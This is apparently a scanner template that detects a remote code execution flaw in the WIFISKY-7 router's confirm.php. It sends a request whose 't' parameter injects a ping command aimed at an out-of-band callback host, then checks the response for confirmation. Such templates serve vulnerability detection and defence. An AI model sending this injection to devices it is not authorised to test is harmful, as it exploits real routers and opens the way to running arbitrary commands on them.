id: wifisky7-rce
brief:
    title: WIFISKY-7 Layer Flow Control Router - Remote Code Execution
    by: pussycat0x
    level: high
    about: There is an RCE vulnerability in the confirm.php interface of WIFISKY-7 layer flow control router
    label:
        - wifisky
        - rce
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/notice/confirm.php?t=%3bping+-c+3+{{interactsh-url}}'
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
        - "on": word
          has:
            - L7Engine
          in: header
          need: all
        - "on": status
          status:
            - 200
